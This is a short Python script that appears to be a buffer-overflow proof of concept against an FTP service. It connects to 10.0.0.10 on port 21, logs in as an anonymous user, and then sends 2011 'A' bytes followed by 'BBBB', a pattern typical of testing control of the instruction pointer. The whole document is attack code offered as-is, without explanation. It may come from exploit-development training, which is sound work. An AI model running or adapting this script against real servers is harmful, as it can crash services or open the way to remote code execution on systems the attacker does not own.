import socket

import sys

USER    = "anonymous"

PASSWD  = "TEST"

PAYLOAD = "\x41" * 2011 + "BBBB"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("10.0.0.10",21))

data = s.recv(1024)

s.send("USER " + USER + '\r\n')

data = s.recv(1024)

s.send("PASS " + PASSWD + '\r\n')

data = s.recv(1024)

s.send(PAYLOAD +'\r\n')

s.close()
